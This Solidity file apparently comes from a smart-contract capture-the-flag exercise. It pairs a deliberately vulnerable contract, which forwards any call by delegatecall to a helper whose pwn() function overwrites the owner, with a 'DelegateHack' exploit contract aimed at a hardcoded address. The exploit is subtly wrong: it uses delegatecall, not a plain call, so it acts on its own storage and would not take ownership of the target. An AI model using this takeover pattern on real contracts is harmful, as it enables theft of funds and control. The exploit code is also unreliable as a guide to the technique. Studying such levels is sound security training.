pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

pragma solidity ^0.6.0;

contract DelegateHack {
    event Response(bool success, bytes data);

    function exploit() public {
     
      address delegationContract = 0xb53DC644De818500AD1e6685235290a3A9EE4192;

      (bool success, bytes memory data) = delegationContract.delegatecall(abi.encodeWithSignature("pwn()"));
    
      emit Response(success, data);
    }
}
